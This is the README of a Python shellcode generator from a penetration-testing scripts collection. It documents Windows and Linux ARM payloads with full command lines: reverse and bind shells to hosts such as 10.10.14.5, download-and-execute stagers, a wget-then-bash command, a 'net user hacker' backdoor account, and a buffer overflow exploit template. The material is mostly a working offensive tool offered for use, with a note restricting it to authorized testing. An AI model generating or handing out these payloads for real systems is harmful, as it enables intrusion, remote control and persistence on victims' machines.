# Multi-Architecture Shellcode Generator

A powerful Python-based shellcode generator supporting Windows (x86/x64) and Linux (ARM/ARM64) architectures with automatic bad character avoidance.

**⚠️ This tool has been refactored into a modular structure. See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for details.**

## Quick Start

**Zero-Configuration Usage** - Use wrapper scripts (no venv activation needed):

```bash
# List available payloads
./shellgen.sh --list-payloads
./hashgen.sh LoadLibraryA

# Generate Windows MessageBox
./shellgen.sh --platform windows --payload messagebox --title "Pwned" --message "Hello!"

# Generate Linux ARM64 reverse shell
./shellgen.sh --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64

# Generate Windows x86 command execution
./shellgen.sh --platform windows --payload winexec --cmd "calc.exe" --arch x86

# Generate API hashes
./hashgen.sh --format python LoadLibraryA GetProcAddress
```

**Alternative** - Direct script usage (requires venv activation):

```bash
# Activate venv first
source venv/bin/activate

# Then use the tools
./shellgen_cli.py --list-payloads
./hash_generator.py LoadLibraryA
```

See [USE_WITHOUT_ACTIVATE.md](USE_WITHOUT_ACTIVATE.md) for more usage options.

## Project Structure

The tool has been refactored into a modular package structure:

```
shellcode/
├── shellgen/                    # Main package
│   ├── __init__.py             # Package initialization
│   ├── encoders.py             # Bad character encoding
│   ├── assembler.py            # Assembly and verification (Keystone)
│   ├── formatters.py           # Output formatters
│   ├── payloads.py             # High-level payload builders
│   ├── cli.py                  # Command-line interface
│   └── generators/             # OS-specific generators
│       ├── windows.py          # Windows (x86/x64/ARM/ARM64) - PEB walk, API resolution
│       └── linux.py            # Linux (x86/x64/ARM/ARM64) - Syscalls
├── shellgen_cli.py             # Main CLI entry point
├── hash_generator.py           # ROR13 hash generator for API resolution
├── shellgen.sh                 # Wrapper script (no venv activation needed!)
├── hashgen.sh                  # Hash generator wrapper (no venv activation needed!)
├── common_apis.txt             # Common Windows API function names
├── requirements.txt            # Python dependencies
├── README.md                   # This file
├── CLAUDE.md                   # Technical documentation
└── shellcode.py                # DEPRECATED - Legacy monolithic script
```

**Note:** The original `shellcode.py` is deprecated. Use `shellgen_cli.py` instead.

## Installation

### Prerequisites

- Python 3.6 or higher
- python3-venv (virtual environment support)
- Build tools for Keystone Engine

### Recommended: Virtual Environment Installation

Using a dedicated virtual environment is the cleanest and recommended approach.

#### Ubuntu/Debian

```bash
# Install system dependencies
sudo apt update
sudo apt install -y python3 python3-venv python3-pip cmake build-essential

# Navigate to the shellcode directory
cd /path/to/pentest-scripts/shellcode

# Create a dedicated virtual environment
python3 -m venv venv

# Activate the virtual environment
source venv/bin/activate

# Install dependencies in the virtual environment
pip install -r requirements.txt

# Verify installation
./shellgen_cli.py --list-payloads
```

#### Fedora/RHEL/CentOS

```bash
# Install system dependencies
sudo dnf install -y python3 python3-pip cmake gcc gcc-c++ make

# Navigate to the shellcode directory
cd /path/to/pentest-scripts/shellcode

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Verify installation
./shellgen_cli.py --list-payloads
```

#### Arch Linux

```bash
# Install system dependencies
sudo pacman -S python python-pip cmake base-devel

# Navigate to the shellcode directory
cd /path/to/pentest-scripts/shellcode

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Verify installation
./shellgen_cli.py --list-payloads
```

#### Alpine Linux

```bash
# Install system dependencies
apk add --no-cache python3 py3-pip cmake make gcc g++ musl-dev

# Navigate to the shellcode directory
cd /path/to/pentest-scripts/shellcode

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Verify installation
./shellgen_cli.py --list-payloads
```

### Using the Virtual Environment

Every time you want to use the shellcode generator, activate the virtual environment first:

```bash
# Navigate to the shellcode directory
cd /path/to/pentest-scripts/shellcode

# Activate the virtual environment
source venv/bin/activate

# Now you can use the tool
./shellgen_cli.py --platform linux --payload execve --cmd "whoami" --arch arm64

# When done, deactivate the virtual environment
deactivate
```

## Setting Up as a System Tool

### Option 1: Wrapper Script (Recommended)

Create a wrapper script that automatically activates the virtual environment:

```bash
# Navigate to shellcode directory
cd /path/to/pentest-scripts/shellcode

# Create wrapper script
cat > shellcode-wrapper.sh << 'EOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/venv/bin/activate"
"$SCRIPT_DIR/shellgen_cli.py" "$@"
deactivate
EOF

# Make it executable
chmod +x shellcode-wrapper.sh

# Create symlink in ~/bin
mkdir -p ~/bin
ln -s "$(pwd)/shellcode-wrapper.sh" ~/bin/shellgen

# Add to PATH (if not already)
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# Now you can run from anywhere
shellgen --list-payloads
shellgen --platform windows --payload messagebox --title "Test" --message "Hello!"
```

### Option 2: Bash Function

Add a bash function to your shell configuration:

```bash
# Add to ~/.bashrc or ~/.zshrc
cat >> ~/.bashrc << 'EOF'

# Shellcode generator function
shellgen() {
    SHELLCODE_DIR="/path/to/pentest-scripts/shellcode"
    (cd "$SHELLCODE_DIR" && source venv/bin/activate && ./shellgen_cli.py "$@")
}
EOF

# Reload shell configuration
source ~/.bashrc

# Now you can run from anywhere
shellgen --list-payloads
```

**Note:** Replace `/path/to/pentest-scripts/shellcode` with the actual path to your shellcode directory.

## Available Payloads

### Windows (x86/x64)
- **messagebox** - Display MessageBox dialog
- **winexec** - Execute command via WinExec
- **createprocess** - Execute command via CreateProcessA (more flexible than WinExec)
- **shellexecute** - Execute programs/URLs via ShellExecuteA (supports operations like "open", "runas")
- **system** - Execute command via system() from msvcrt.dll (C runtime)
- **download_exec** - Download file and execute (URLDownloadToFile + WinExec)
- **reverse_shell** - Native socket reverse shell (runs in current process, most stealthy)
- **reverse_shell_powershell** - PowerShell reverse shell (spawns child process, more reliable)
- **bind_shell** - Native TCP bind shell (listens for incoming connections)

### Linux (ARM/ARM64)
- **execve** - Execute command via syscall
- **reverse_shell** - Native socket reverse shell

## Usage Examples

### Windows Payloads

#### MessageBox
```bash
shellgen --platform windows --payload messagebox \
  --title "Pwned" \
  --message "Hello from shellcode!" \
  --arch x86
```

#### WinExec Command
```bash
shellgen --platform windows --payload winexec \
  --cmd "calc.exe" \
  --arch x86 \
  --bad-chars 00,0a,0d \
  --verify
```

#### CreateProcessA Command (More Flexible)
```bash
shellgen --platform windows --payload createprocess \
  --cmd "cmd.exe /c whoami > C:\\output.txt" \
  --arch x86 \
  --show-window 0
```

#### ShellExecuteA (Execute Programs/URLs)
```bash
# Execute a program
shellgen --platform windows --payload shellexecute \
  --cmd "notepad.exe" \
  --arch x86

# Open a URL in browser
shellgen --platform windows --payload shellexecute \
  --cmd "https://example.com" \
  --arch x86
```

#### system() Command (C Runtime)
```bash
shellgen --platform windows --payload system \
  --cmd "net user hacker Password123! /add" \
  --arch x86 \
  --bad-chars 00,0a,0d
```

#### Download & Execute
```bash
shellgen --platform windows --payload download_exec \
  --url "http://10.10.14.5/payload.exe" \
  --save-path "C:\\temp\\p.exe" \
  --arch x86
```

#### Native Socket Reverse Shell (Stealthy - Runs in Current Process)
```bash
# Start listener on attacker machine
nc -lvnp 443

# Generate shellcode with default cmd.exe shell
shellgen --platform windows --payload reverse_shell \
  --host 10.10.14.5 \
  --port 443 \
  --arch x86

# Generate with custom shell (e.g., powershell.exe)
shellgen --platform windows --payload reverse_shell \
  --host 10.10.14.5 \
  --port 443 \
  --shell "powershell.exe" \
  --arch x86

# The native reverse shell:
# - Creates socket via WSASocketA (inheritable by default)
# - Connects to attacker host
# - Redirects stdin/stdout/stderr to socket in STARTUPINFOA
# - Launches specified shell (default: cmd.exe) with bInheritHandles=TRUE
# - Waits for shell process to exit via WaitForSingleObject(INFINITE)
# - Uses NEG encoding (two's complement) for shell string to avoid null bytes
```

#### PowerShell Reverse Shell (Reliable - Spawns Child Process)
```bash
shellgen --platform windows --payload reverse_shell_powershell \
  --host 10.10.14.5 \
  --port 443 \
  --arch x86
```

#### Debug Shellcode for Bad Characters
```bash
# Print opcodes line by line with bad character highlighting
shellgen --platform windows --payload winexec \
  --cmd "calc.exe" \
  --arch x86 \
  --bad-chars 00,0a,0d,20 \
  --debug-shellcode

# Output shows:
# - Line number and offset for each instruction
# - Opcodes in hex format
# - Bad characters highlighted in red
# - Summary of total bad characters found
```

### Linux ARM/ARM64 Payloads

#### ARM64 Reverse Shell
```bash
shellgen --platform linux --payload reverse_shell \
  --host 192.168.1.100 \
  --port 4444 \
  --arch arm64 \
  --format python \
  --output revshell_arm64.py
```

#### ARM32 Command Execution
```bash
shellgen --platform linux --payload execve \
  --cmd "wget http://10.10.14.5/shell.sh -O /tmp/s.sh && bash /tmp/s.sh" \
  --arch arm \
  --format c \
  --output payload_arm32.c
```

#### ARM64 Execute /bin/sh
```bash
shellgen --platform linux --payload execve \
  --cmd "/bin/sh" \
  --arch arm64
```

### Output Formats

#### Assembly Format (default)
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64
# Creates shellcode.asm
```

#### Python Bytes Format
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64 --format python
```

#### C Array Format
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64 --format c
```

#### Raw Binary Format
```bash
shellgen --platform linux --payload execve --cmd "whoami" --arch arm64 --format raw --output payload.bin
```

#### Python Assembly Script
```bash
shellgen --platform windows --payload winexec --cmd "calc.exe" --format pyasm --output shellcode_asm.py
# Creates a Python script with assembly code that can be assembled with Keystone
```

### Custom JSON Payloads

For advanced use cases, you can create custom payloads by defining API calls in a JSON file. This allows you to chain together any Windows API functions with precise control over arguments.

#### JSON Payload Format

```json
{
  "bad_chars": [0, 10, 13],
  "calls": [
    {
      "api": "MessageBoxA",
      "dll": "user32.dll",
      "args": [0, "Hello from custom shellcode!", "Custom Payload", 0]
    }
  ],
  "exit": true
}
```

**Field Descriptions:**
- `bad_chars` - Array of byte values to avoid (optional, defaults to `[0, 10, 13]`)
- `calls` - Array of API call objects (required)
  - `api` - Windows API function name (e.g., "CreateFileA", "WriteFile")
  - `dll` - DLL containing the function (e.g., "kernel32.dll", "user32.dll")
  - `args` - Array of arguments to pass to the function
    - Numbers (e.g., `0`, `0x40000000`)
    - Strings (e.g., `"C:\\test.txt"`, `"Hello World!"`)
    - Register references (e.g., `"REG:eax"`, `"REG:esp"`)
- `exit` - Whether to call ExitProcess at the end (optional, defaults to `true`)

#### Using Custom JSON Payloads

```bash
# Create your custom payload JSON file
cat > my_payload.json << 'EOF'
{
  "bad_chars": [0, 10, 13],
  "calls": [
    {
      "api": "CreateFileA",
      "dll": "kernel32.dll",
      "args": ["C:\\test.txt", 0x40000000, 0, 0, 2, 0, 0]
    },
    {
      "api": "WriteFile",
      "dll": "kernel32.dll",
      "args": ["REG:eax", "Hello World!", 12, "REG:esp", 0]
    },
    {
      "api": "CloseHandle",
      "dll": "kernel32.dll",
      "args": ["REG:eax"]
    }
  ],
  "exit": true
}
EOF

# Generate shellcode from JSON (uses bad_chars from JSON)
./shellgen.sh --platform windows --json my_payload.json --arch x86

# Override bad_chars from command line (adds 0x20 to bad characters)
./shellgen.sh --platform windows --json my_payload.json --arch x86 --bad-chars 00,0a,0d,20
```

**Note:** When using `--json`, the `--bad-chars` CLI argument will override the `bad_chars` specified in the JSON file. The tool will display which source is being used for bad characters.

#### Example: MessageBox Payload (example_payload.json)

The project includes a sample custom payload:

```bash
# View the example
cat example_payload.json

# Generate shellcode from example
./shellgen.sh --platform windows --json example_payload.json --arch x86 --format python
```

#### Advanced Example: File Write + Execute

```json
{
  "bad_chars": [0, 10, 13],
  "calls": [
    {
      "api": "CreateFileA",
      "dll": "kernel32.dll",
      "args": ["C:\\payload.bat", 0x40000000, 0, 0, 2, 0x80, 0]
    },
    {
      "api": "WriteFile",
      "dll": "kernel32.dll",
      "args": ["REG:eax", "@echo off\r\nnet user hacker Pass123! /add\r\n", 45, "REG:esp", 0]
    },
    {
      "api": "CloseHandle",
      "dll": "kernel32.dll",
      "args": ["REG:eax"]
    },
    {
      "api": "WinExec",
      "dll": "kernel32.dll",
      "args": ["C:\\payload.bat", 0]
    }
  ],
  "exit": true
}
```

#### Register References

Use `"REG:register_name"` to reference values stored in registers from previous API calls:

- `"REG:eax"` - Return value from previous API call
- `"REG:ebx"` - EBX register value
- `"REG:ecx"` - ECX register value (often used for string pointers)
- `"REG:edx"` - EDX register value
- `"REG:esi"` - ESI register value
- `"REG:edi"` - EDI register value
- `"REG:esp"` - Stack pointer (useful for passing pointer to DWORD)

**Example:** CreateFileA returns file handle in EAX, which is then used by WriteFile:

```json
{
  "calls": [
    {
      "api": "CreateFileA",
      "args": ["C:\\test.txt", 0x40000000, 0, 0, 2, 0, 0]
    },
    {
      "api": "WriteFile",
      "args": ["REG:eax", "Data", 4, "REG:esp", 0]
    }
  ]
}
```

#### Common API Function Arguments

**CreateFileA:**
```json
{
  "api": "CreateFileA",
  "dll": "kernel32.dll",
  "args": [
    "C:\\path\\to\\file.txt",  // lpFileName
    0x40000000,                 // dwDesiredAccess (GENERIC_WRITE)
    0,                          // dwShareMode
    0,                          // lpSecurityAttributes
    2,                          // dwCreationDisposition (CREATE_ALWAYS)
    0x80,                       // dwFlagsAndAttributes (FILE_ATTRIBUTE_NORMAL)
    0                           // hTemplateFile
  ]
}
```

**WriteFile:**
```json
{
  "api": "WriteFile",
  "dll": "kernel32.dll",
  "args": [
    "REG:eax",          // hFile (handle from CreateFileA)
    "Hello World!",     // lpBuffer (data to write)
    12,                 // nNumberOfBytesToWrite
    "REG:esp",          // lpNumberOfBytesWritten (pointer to DWORD)
    0                   // lpOverlapped
  ]
}
```

**MessageBoxA:**
```json
{
  "api": "MessageBoxA",
  "dll": "user32.dll",
  "args": [
    0,              // hWnd
    "Message text", // lpText
    "Title",        // lpCaption
    0               // uType (MB_OK)
  ]
}
```

#### Tips for Custom Payloads

1. **Test incrementally** - Start with simple API calls and add complexity
2. **Use --debug-shellcode** - Identify bad characters in generated opcodes
3. **Reference Windows API docs** - Ensure correct argument order and types
4. **Chain API calls** - Use register references to pass data between calls
5. **Minimize bad chars** - Use NEG encoding for strings when needed
6. **Verify output** - Always test with `--verify` flag

## Command Reference

```
Options:
  --list-payloads           List all available payloads
  --platform {windows,linux}
                            Target platform (required)
  --payload PAYLOAD         Payload name (required unless using --json)
  --arch {x86,x64,arm,arm64}
                            Target architecture (default: x86)
  --format {asm,python,c,raw,pyasm}
                            Output format (default: asm)
  --bad-chars BAD_CHARS     Comma-separated hex bytes to avoid (default: 00)
                            When using --json, this overrides bad_chars from the JSON file

  # Custom payload:
  --json JSON_FILE          Load custom payload from JSON file
                            (replaces --payload and payload-specific options)
                            bad_chars from JSON can be overridden with --bad-chars CLI arg

  # Payload-specific options:
  --title TITLE             MessageBox title
  --message MESSAGE         MessageBox message
  --cmd CMD                 Command to execute
  --show-window N           Window visibility (0=hidden, 1=normal)
  --url URL                 URL to download from
  --save-path PATH          Local path to save file
  --host HOST               Target IP address for reverse shell
  --port PORT               Target port for reverse shell
  --shell SHELL             Shell to execute (e.g., cmd.exe, powershell.exe, /bin/bash)
                            Works with: reverse_shell (Windows/Linux), execve (Linux)

  # Output options:
  --output OUTPUT           Output filename (default: shellcode.asm)
  --verify                  Verify assembled shellcode for bad characters
  --debug-shellcode         Print opcodes line by line to identify bad characters
  --no-exit                 Skip ExitProcess at the end (Windows only)
```

## Supported Architectures

| Architecture | Platform | Assembler Required | Status |
|-------------|----------|-------------------|--------|
| x86 (32-bit) | Windows | Keystone | ✅ Full Support |
| x64 (64-bit) | Windows | Keystone | ✅ Full Support |
| ARM32 | Linux | **Keystone Only** | ✅ Full Support |
| ARM64 | Linux | **Keystone Only** | ✅ Full Support |

**Important:** All architectures now require Keystone Engine.

## Features

- ✅ Multi-architecture support (x86, x64, ARM32, ARM64)
- ✅ Automatic bad character avoidance for Windows payloads
- ✅ Multiple output formats (ASM, Python, C, Raw Binary, PyASM)
- ✅ Built-in shellcode verification
- ✅ **Debug mode**: Line-by-line opcode analysis with bad character highlighting
- ✅ **Enhanced Visual Output**: Colored panels, progress indicators, hex previews
- ✅ **Architecture Matrix**: Interactive table showing payload compatibility
- ✅ Robust PEB walk with kernel32.dll length check (Windows)
- ✅ InInitializationOrderModuleList optimization (Windows)
- ✅ LoadLibraryA support for external DLLs (Windows)
- ✅ Native socket reverse shell with proper handle inheritance (Windows)
- ✅ Direct syscall implementation (Linux)
- ✅ String consolidation for size optimization
- ✅ ROR13 hash-based function lookup
- ✅ Modular architecture for easy extension

## Visual Features & Output Enhancement

The shellcode generator now includes a rich visual interface with colored output and enhanced formatting (using the shared `lib/color_printer` library):

### Assembly Progress & Success

When generating shellcode, you'll see:
- **Progress indicator**: "⚙ Assembling shellcode with Keystone Engine..."
- **Success panel** (green): Shows shellcode size and instruction count
- **Hex preview**: First 16 bytes displayed in hex + ASCII format

### Bad Character Detection

- **Clean scan** (green panel): "✓ Bad Character Scan - CLEAN"
- **Warning panel** (yellow): "⚠ Bad Character Scan - WARNING" with detailed breakdown
- **Recommendation panel** (cyan): Helpful tips for fixing bad character issues

### API Hash Display

Windows payloads show ROR13 API hashes in a cyan panel box:
- LoadLibraryA and all resolved APIs
- GetCurrentProcess / TerminateProcess for clean exits
- Formatted for easy reference

### Enhanced Payload List

Use `--list-payloads` to see:
- Categorized payloads (Windows/Linux)
- **Architecture support** displayed for each payload
- **Compatibility matrix**: Tables showing which architectures work with each payload
- **Examples section**: Common usage patterns with copy-paste commands
- **Quick tips panel**: Reminders about --arch, --format, --bad-chars

### Colored Output Formats

Output formats automatically detect TTY vs file output:
- **Terminal**: Colored headers, variable names, and syntax highlighting
- **File/pipe**: Plain text with no ANSI codes (safe for scripts)

### Dependencies

Visual features require the Rich library (included in requirements.txt):
```bash
pip install rich
```

If Rich is not available, the tool automatically falls back to plain text output.

## Integration with Exploit Development

### Example: Buffer Overflow Exploit

```python
#!/usr/bin/env python3
import struct

# Generate shellcode with:
# shellgen --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64 --format python

shellcode = b"\x42\x00\x80\xd2\x21\x00\x00\x8b..."  # Your generated shellcode

# Build exploit payload
offset = 264  # Offset to return address
padding = b"A" * offset

# ARM64 little-endian address
ret_addr = struct.pack("<Q", 0xffffdeadbeef)

payload = padding + ret_addr + shellcode

# Send payload to target
with open('exploit_payload.bin', 'wb') as f:
    f.write(payload)

print(f"[+] Exploit payload created: {len(payload)} bytes")
print(f"[+] Shellcode size: {len(shellcode)} bytes")
```

## Using as a Python Library

```python
from shellgen.generators import WindowsGenerator, LinuxGenerator
from shellgen.payloads import windows_messagebox, linux_execve
from shellgen.assembler import assemble_to_binary

# Example 1: Windows MessageBox (x86)
config = windows_messagebox(
    title="Pwned",
    message="Hello from shellcode!",
    bad_chars={0x00, 0x0a, 0x0d}
)

generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
shellcode = assemble_to_binary(asm_code, arch='x86')
print(f"Windows x86 shellcode size: {len(shellcode)} bytes")

# Example 2: Linux ARM64 execve
config = linux_execve(
    command="/bin/sh",
    bad_chars={0x00, 0x0a, 0x0d},
    arch='arm64'
)

generator = LinuxGenerator(config['bad_chars'], arch='arm64')
asm_code = generator.generate(config)
shellcode = assemble_to_binary(asm_code, arch='arm64')
print(f"Linux ARM64 shellcode size: {len(shellcode)} bytes")
```

## Migration from Old Script

The original `shellcode.py` monolithic script is deprecated. Here's the migration guide:

### Old Command
```bash
python3 shellcode.py --payload winexec_cmd --cmd "calc.exe" --arch x86
```

### New Command
```bash
./shellgen_cli.py --platform windows --payload winexec --cmd "calc.exe" --arch x86
```

### Payload Name Changes

| Old Payload       | New Payload      | Platform  |
|-------------------|------------------|-----------|
| `winexec_cmd`     | `winexec`        | `windows` |
| `winexec_smb`     | *(removed)*      | -         |
| `reverse_shell`   | `reverse_shell`  | `windows` or `linux` |
| `execve`          | `execve`         | `linux`   |
| *(new)*           | `messagebox`     | `windows` |
| *(new)*           | `download_exec`  | `windows` |

See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for complete migration details.

## Security Notice

This tool is designed for **authorized security testing only**. Use cases include:
- Penetration testing engagements
- Exploit development research
- Red team operations
- Security training
- CTF competitions

**Unauthorized use is illegal and unethical.**

## Architecture-Specific Notes

### ARM/ARM64 Linux
- Uses direct syscalls (no libc dependencies)
- Syscall numbers:
  - ARM32: socket=281, connect=283, dup2=63, execve=11
  - ARM64: socket=198, connect=203, dup3=24, execve=221
- Requires Keystone Engine for assembly

### Windows x86/x64
- Robust PEB walk with kernel32.dll length check (24 bytes)
- InInitializationOrderModuleList for fast kernel32 lookup
- ROR13 hashing for API lookup
- LoadLibraryA support for external DLLs
- Automatic bad character encoding

## ROR13 Hash Generator

The `hash_generator.py` tool generates ROR13 hashes for Windows API functions. These hashes are used in shellcode for dynamic API resolution without embedding function name strings.

### Basic Usage

```bash
# Generate hash for a single function
./hash_generator.py LoadLibraryA

# Output:
# ========================================================================
# ROR13 Hash Generator
# ========================================================================
#
# LoadLibraryA  =>  0xec0e4e8e
```

### Multiple Functions

```bash
./hash_generator.py LoadLibraryA GetProcAddress CreateProcessA

# Generates hashes for all specified functions
```

### Read from File

The tool includes `common_apis.txt` with commonly used Windows APIs:

```bash
./hash_generator.py --file common_apis.txt --format python > api_hashes.py
```

### Output Formats

**Python Dictionary:**
```bash
./hash_generator.py --format python LoadLibraryA GetProcAddress
```
```python
API_HASHES = {
    'LoadLibraryA': 0xec0e4e8e,
    'GetProcAddress': 0x7c0dfcaa,
}
```

**Assembly Constants:**
```bash
./hash_generator.py --format asm CreateProcessA TerminateProcess
```
```asm
CREATEPROCESSA_HASH            equ 0x16b3fe72  ; CreateProcessA
TERMINATEPROCESS_HASH          equ 0x78b5b983  ; TerminateProcess
```

**C Struct Array:**
```bash
./hash_generator.py --format c MessageBoxA ExitProcess
```

**JSON:**
```bash
./hash_generator.py --format json WSAStartup WSASocketA
```

### Verify Hashes

```bash
./hash_generator.py --verify "CreateProcessA:0x16b3fe72"
# Output:
# Function: CreateProcessA
# Expected: 0x16b3fe72
# Actual:   0x16b3fe72
# ✓ MATCH
```

### Integration with Shellcode

Use the generated hashes in custom shellcode:

```asm
; Resolve CreateProcessA from kernel32.dll
push 0x16b3fe72               ; CreateProcessA hash
call find_function            ; Your ROR13 hash lookup function
; EAX now contains address of CreateProcessA
```

Or import in Python:

```python
from hash_generator import ror13_hash

# Generate hash for any API function
hash_val = ror13_hash("CreateFileA")
print(f"push 0x{hash_val:08x}    ; CreateFileA hash")
```

### Common API Hashes

| Function           | Hash       | DLL          |
|--------------------|------------|--------------|
| LoadLibraryA       | 0xec0e4e8e | kernel32.dll |
| GetProcAddress     | 0x7c0dfcaa | kernel32.dll |
| CreateProcessA     | 0x16b3fe72 | kernel32.dll |
| TerminateProcess   | 0x78b5b983 | kernel32.dll |
| WinExec            | 0x0e8afe98 | kernel32.dll |
| MessageBoxA        | 0xbc4da2a8 | user32.dll   |
| WSAStartup         | 0x3bfcedcb | ws2_32.dll   |
| WSASocketA         | 0xadf509d9 | ws2_32.dll   |
| WSAConnect         | 0xb32dba0c | ws2_32.dll   |

## Troubleshooting

### "No module named 'keystone'"

Make sure you're in the virtual environment:
```bash
source venv/bin/activate
pip install keystone-engine
```

### "Cannot encode 0x... avoiding bad chars"

The encoder couldn't find clean values. Try:
- Reducing bad character restrictions
- Using different payload type
- Different command/string values

### Keystone build fails on older systems

See the installation troubleshooting section in the original README or install from source.

## Documentation

- **README.md** - Installation and usage (this file)
- **MODULAR_STRUCTURE.md** - Detailed modular architecture documentation
- **CLAUDE.md** - Technical documentation and implementation details

## Additional Resources

- **Keystone Engine** - https://www.keystone-engine.org/
- **ARM Syscall Reference** - https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
- **Windows PEB Structure** - https://en.wikipedia.org/wiki/Process_Environment_Block

## Uninstallation

### Remove Virtual Environment
```bash
cd /path/to/pentest-scripts/shellcode
rm -rf venv
```

### Remove Wrapper Script/Symlink
```bash
rm ~/bin/shellgen
rm shellcode-wrapper.sh
```

## License

For authorized security testing and research purposes only.

## Author

Dawid Esterhuizen

---

**Note:** Always ensure you have explicit permission before testing on any system you do not own.
